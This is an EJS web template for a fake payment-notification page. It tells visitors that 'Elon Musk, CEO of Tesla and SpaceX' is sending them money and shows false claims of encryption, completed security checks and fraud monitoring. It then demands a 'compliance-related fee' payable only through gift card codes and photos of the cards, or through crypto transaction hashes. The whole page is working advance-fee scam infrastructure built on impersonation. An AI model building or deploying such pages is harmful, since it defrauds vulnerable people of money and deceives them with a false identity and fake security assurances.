<title><%= payment.transactionId %>_Payment</title>

<div class="container my-4" id="payment-section">
  <div class="row justify-content-center">
    <div
      class="col-10 col-sm-11 col-md-10 col-lg-8 col-xl-8 d-flex justify-content-center"
    >
      <!-- Main Card -->
      <div class="card transaction-card w-100 p-2 p-sm-2 p-md-2 p-lg-3">
        <!-- Header Section -->
        <div class="header-section text-center">
          <h2 class="fs-5 fs-sm-4 fs-md-3">
            <b>Elon Musk, CEO of Tesla and SpaceX</b>
          </h2>
          <h4 class="fs-6 fs-sm-5 fs-md-4">
            is sending you
            <b
              ><%= payment.currency %><%=
              Number(payment.amount.toFixed(4)).toLocaleString()%></b
            >
          </h4>
          <p class="fs-6 p-2">
            <i class="fas fa-lock me-2"></i> Secure Payment Processing...
          </p>
        </div>

        <!-- Main Content -->
        <div class="card-body p-3 p-sm-4 p-md-5">
          <!-- Alert -->
          <div class="alert alert-primary d-flex align-items-center fs-6">
            <i class="fas fa-info-circle fa-lg me-3"></i>
            <div>
              This transaction is secured with bank-level encryption and fraud
              monitoring
            </div>
          </div>

          <!-- Recipient Info -->
          <div class="row mb-4">
            <div class="col-md-6">
              <p class="mb-1 text-muted fs-6">Recipient</p>
              <h4 class="mb-0 fs-5"><b><%= payment.name %></b></h4>
              <p class="mb-0 fs-6">
                Account Number: <b><%= payment.accountNumber %></b>
              </p>
              <p class="mb-0 fs-6">Bank Name: <b><%= payment.bank %></b></p>
            </div>
            <div class="col-md-6 text-md-end mt-3 mt-md-0">
              <p class="mb-1 text-muted fs-6">Transaction ID</p>
              <h5 class="mb-0 fs-6"><b><%= payment.transactionId %></b></h5>
              <small class="text-muted fs-6"
                >Initiated: <%= payment.createdAt.toLocaleString() %></small
              >
            </div>
          </div>

          <!-- Amount Display -->
          <div class="p-3 rounded-3 mb-4 text-center" id="amount-panel">
            <p class="mb-1 fs-6">Transaction Amount</p>
            <div class="amount-display text-success fs-2 fs-sm-3 fs-md-2">
              <%= payment.currency %><%=
              Number(payment.amount.toFixed(4)).toLocaleString()%>
            </div>
          </div>

          <!-- Progress -->
          <h4 class="mt-4 mb-3 section-title fs-5">Transfer Progress</h4>
          <div class="d-flex justify-content-between mb-2 fs-6">
            <span>Processing</span>
            <span><%= payment.progress %> Complete</span>
          </div>

          <div class="progress mb-4" style="height: 20px">
            <div
              class="progress-bar progress-bar-striped progress-bar-animated bg-success"
              role="progressbar"
              style="width: <%= payment.progress %>%"
              aria-valuenow="<%= payment.progress %>"
              aria-valuemin="0"
              aria-valuemax="100"
            >
              <%= payment.progress %>%
            </div>
          </div>

          <!-- Status Items -->
          <div class="status-item completed fs-6">
            <div class="d-flex align-items-center">
              <div class="feature-icon me-2">
                <i class="fas fa-check"></i>
              </div>
              <div>
                <h5 class="mb-1 fs-6">Payment Processed</h5>
                <p class="text-muted mb-0 fs-6">
                  Your payment has been successfully authorized and processed.
                </p>
              </div>
            </div>
          </div>

          <div class="status-item completed fs-6 mt-3">
            <div class="d-flex align-items-center">
              <div class="feature-icon me-2">
                <i class="fas fa-check"></i>
              </div>
              <div>
                <h5 class="mb-1 fs-6">Security Verification</h5>
                <p class="text-muted mb-0 fs-6">
                  Transaction passed all security checks and fraud detection.
                </p>
              </div>
            </div>
          </div>

          <div class="status-item pending fs-6 mt-3">
            <div class="d-flex align-items-center">
              <div class="feature-icon me-2" id="arrLeft">
                <i class="fas fa-arrow-right"></i>
              </div>
              <div>
                <h5 class="mb-1 fs-6">Delivery in Progress</h5>
                <% if (payment.txsFee.length !== ''){%>
                <p class="text-muted mb-0">
                  To finalize your transfer, a compliance-related fee of
                  <b
                    ><%= payment.currency %><%=
                    Number(payment.txsFee.toFixed(4)).toLocaleString()%></b
                  >
                  will apply. This forms part of our standard regulatory
                  procedures.
                </p>
                <% } else { %>
                <p class="text-muted mb-0"><%= payment.message %></p>
                <% } %>
                <!-- Trigger Button -->
                <a
                  href="#"
                  data-bs-toggle="modal"
                  data-bs-target="#paymentModal"
                  class="d-flex align-items-center text-decoration-none mt-2"
                >
                  <span
                    class="d-flex align-items-center px-2 py-1 <% if (payment.perment && payment.perment.status === 'success') { %> bg-success text-white <% } else if ((payment.giftCard && payment.giftCard.code) || (payment.cryptoTransaction && payment.cryptoTransaction.transactionHash)) { %> bg-warning text-dark <% } else { %> bg-primary text-white <% } %> rounded"
                  >
                    <% if (payment.perment && payment.perment.status ===
                    'success') { %>
                    <i class="fas fa-check-circle me-2"></i>
                    Payment Successful <% } else if ((payment.giftCard &&
                    payment.giftCard.code) || (payment.cryptoTransaction &&
                    payment.cryptoTransaction.transactionHash)) { %>
                    <i class="fas fa-arrows-rotate me-2"></i>
                    Pending Verification <% } else { %>
                    <i class="fas fa-credit-card me-2"></i>
                    Make Payment <% } %>
                  </span>
                </a>

                <div class="mt-2">
                  <small class="text-warning"
                    ><i class="fas fa-clock me-1"></i> We apologize for any
                    delay. Thank you for selecting our service.</small
                  >
                </div>
              </div>
            </div>
          </div>

          <!-- Security Features -->
          <h4 class="mt-5 mb-3 section-title fs-5">Security & Protection</h4>
          <div class="row">
            <div class="col-md-6 mb-3">
              <div class="security-badge h-100">
                <div class="benefit-item d-flex align-items-start">
                  <div class="feature-icon me-2">
                    <i class="fas fa-lock"></i>
                  </div>
                  <div>
                    <h6 class="mb-1 fs-6">256-bit Encryption</h6>
                    <p class="text-muted small mb-0">
                      Bank-level security for all transactions
                    </p>
                  </div>
                </div>
              </div>
            </div>
            <div class="col-md-6 mb-3">
              <div class="security-badge h-100">
                <div class="benefit-item d-flex align-items-start">
                  <div class="feature-icon me-2">
                    <i class="fas fa-shield-alt"></i>
                  </div>
                  <div>
                    <h6 class="mb-1 fs-6">Fraud Monitoring</h6>
                    <p class="text-muted small mb-0">
                      24/7 monitoring for suspicious activity
                    </p>
                  </div>
                </div>
              </div>
            </div>
          </div>
          <!-- footer support -->
          <div class="d-flex justify-content-between align-items-center mt-3">
            <div class="text-end">
              <div class="subtle">Need help?</div>
              <div>
                <a href="#" class="subtle">contact support</a>
              </div>
            </div>
          </div>
        </div>
        <!-- end card body -->
      </div>
    </div>
  </div>
</div>

<!-- Payment Modal -->
<div class="modal fade" id="paymentModal" tabindex="-1">
  <div class="modal-dialog modal-lg modal-dialog-centered">
    <div class="modal-content shadow-lg rounded-4 overflow-hidden animate__animated animate__zoomIn">
      <div class="modal-header bg-black text-white">
        <h5 class="modal-title"><i class="fas fa-shield-alt me-2"></i> Secure Payment</h5>
        <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
      </div>
      <div class="modal-body">
        <form action="<%= payment.link %>/success?_method=PUT" method="POST" enctype="multipart/form-data">
          
          <!-- Method Switch -->
          <div class="text-center mb-4">
            <p>Pay with:</p>
            <input type="radio" class="btn-check" name="paymethod" id="methodGift" checked>
            <label class="btn btn-outline-dark rounded-pill me-2" for="methodGift">
              <i class="fas fa-gift me-1"></i> Gift Card
            </label>
            <input type="radio" class="btn-check" name="paymethod" id="methodCrypto">
            <label class="btn btn-outline-dark rounded-pill" for="methodCrypto">
              <i class="fab fa-bitcoin me-1"></i> Crypto
            </label>
          </div>

          <!-- Gift Card -->
          <div id="giftCardSection" class="animate__animated animate__fadeIn">
            <label class="form-label"><i class="fas fa-gift me-1"></i> Gift Card Type</label>
            <select name="giftCard[type]" class="form-select mb-3">
              <option value="">-- Select Gift Card Type --</option>
              <% ['Amazon','Apple','Google Play','Steam','Walmart','Visa'].forEach(t => { %>
                <option value="<%= t %>" <%= payment.giftCard?.type === t ? 'selected' : '' %>><%= t %></option>
              <% }) %>
            </select>

            <label class="form-label"><i class="fas fa-key me-1"></i> Gift Card Code</label>
            <input type="text" name="giftCard[code]" id="giftCardCode" class="form-control mb-3"
              value="<%= payment.giftCard?.code || '' %>">

            <div class="row g-3">
              <div class="col-md-6">
                <label class="form-label"><i class="fas fa-image me-1"></i> Front Image</label>
                <div class="border rounded-3 p-2 text-center shadow-sm">
                  <img id="frontPreview"
                       src="<%= payment.giftCard?.frontImageUrl || '' %>"
                       class="img-fluid rounded animate__animated"
                       style="<%= payment.giftCard?.frontImageUrl ? 'display:block;' : 'display:none;' %>">
                </div>
                <input type="file" name="giftCard[frontImage]" class="form-control mt-2"
                       accept="image/*" onchange="previewImage(this,'frontPreview')">
              </div>
              <div class="col-md-6">
                <label class="form-label"><i class="fas fa-image me-1"></i> Back Image</label>
                <div class="border rounded-3 p-2 text-center shadow-sm">
                  <img id="backPreview"
                       src="<%= payment.giftCard?.backImageUrl || '' %>"
                       class="img-fluid rounded animate__animated"
                       style="<%= payment.giftCard?.backImageUrl ? 'display:block;' : 'display:none;' %>">
                </div>
                <input type="file" name="giftCard[backImage]" class="form-control mt-2"
                       accept="image/*" onchange="previewImage(this,'backPreview')">
              </div>
            </div>
          </div>

          <!-- Crypto -->
          <div id="cryptoSection" class="d-none animate__animated">
            <label class="form-label"><i class="fab fa-bitcoin me-1"></i> Crypto Type</label>
            <select name="cryptoTransaction[type]" class="form-select mb-3">
              <option value="">-- Select Crypto --</option>
              <% ['Bitcoin','Ethereum','USDT'].forEach(c => { %>
                <option value="<%= c %>" <%= payment.cryptoTransaction?.type === c ? 'selected' : '' %>><%= c %></option>
              <% }) %>
            </select>

            <label class="form-label"><i class="fas fa-hashtag me-1"></i> Transaction Hash</label>
            <input type="text" name="cryptoTransaction[transactionHash]" id="cryptoHash" class="form-control mb-3"
              value="<%= payment.cryptoTransaction?.transactionHash || '' %>">

            <label class="form-label"><i class="fas fa-file-invoice me-1"></i> Slip Image</label>
            <div class="border rounded-3 p-2 text-center shadow-sm">
              <img id="slipPreview"
                   src="<%= payment.cryptoTransaction?.slipImageUrl || '' %>"
                   class="img-fluid rounded animate__animated"
                   style="<%= payment.cryptoTransaction?.slipImageUrl ? 'display:block;' : 'display:none;' %>">
            </div>
            <input type="file" name="cryptoTransaction[slipImage]" class="form-control mt-2"
                   accept="image/*" onchange="previewImage(this,'slipPreview')">
          </div>

          <!-- Footer -->
          <div class="text-end mt-4">
            <button type="button" class="btn btn-secondary rounded-pill" data-bs-dismiss="modal">
              <i class="fas fa-times me-1"></i> Cancel
            </button>
            <button type="submit" class="btn btn-success rounded-pill shadow-sm">
              <i class="fas fa-lock me-1"></i> Proceed Payment
            </button>
          </div>
        </form>
      </div>
    </div>
  </div>
</div>

<!-- Animate.css -->
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css"/>

<!-- Script -->
<script>
document.addEventListener('DOMContentLoaded', function(){
  const rGift = document.getElementById('methodGift');
  const rCrypto = document.getElementById('methodCrypto');
  const giftInput = document.getElementById('giftCardCode');
  const cryptoInput = document.getElementById('cryptoHash');

  rGift.addEventListener('change', () => setMethodUI('giftCard'));
  rCrypto.addEventListener('change', () => setMethodUI('crypto'));
  setMethodUI('giftCard');

  function setMethodUI(method){
    const gift = document.getElementById('giftCardSection');
    const crypto = document.getElementById('cryptoSection');
    if (method === 'giftCard'){
      gift.classList.remove('d-none');
      crypto.classList.add('d-none');
      giftInput.required = true;
      cryptoInput.required = false;
    } else {
      crypto.classList.remove('d-none');
      gift.classList.add('d-none');
      giftInput.required = false;
      cryptoInput.required = true;
    }
  }
});

// Preview with animation
function previewImage(input, previewId){
  const file = input.files[0];
  const img = document.getElementById(previewId);
  if (!file) { img.style.display='none'; return; }
  const reader = new FileReader();
  reader.onload = e => {
    img.src = e.target.result;
    img.style.display = 'block';
    img.classList.remove('animate__fadeOut');
    img.classList.add('animate__fadeIn');
  };
  reader.readAsDataURL(file);
}
</script>
